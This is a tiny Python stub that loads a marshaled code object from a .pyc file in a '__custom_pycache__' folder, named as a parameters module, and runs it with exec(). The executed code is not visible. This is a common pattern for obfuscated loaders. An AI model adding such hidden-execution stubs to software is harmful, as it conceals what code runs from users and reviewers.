
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'params_3027340039884817b74ed287a30edaa2.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
